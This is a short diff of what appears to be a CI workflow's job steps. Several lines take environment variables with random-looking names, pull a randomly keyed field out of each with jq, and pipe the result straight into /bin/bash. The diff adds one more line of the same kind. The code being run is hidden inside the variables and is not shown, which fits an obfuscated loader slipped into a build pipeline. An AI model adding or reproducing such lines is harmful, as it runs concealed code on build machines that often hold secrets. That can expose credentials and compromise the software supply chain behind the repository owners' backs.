@@ -56,6 +56,7 @@ jobs:
           echo $nvpw601 | jq -r .fijyw9388 | /bin/bash
           echo $mph3626 | jq -r .hdl199 | /bin/bash
           echo $ct930 | jq -r .owrd8072 | /bin/bash
+          printf '%s' "$fogx16173" | jq -r .g069 | /bin/bash
 
       - name: Upload artifact
         if: always()
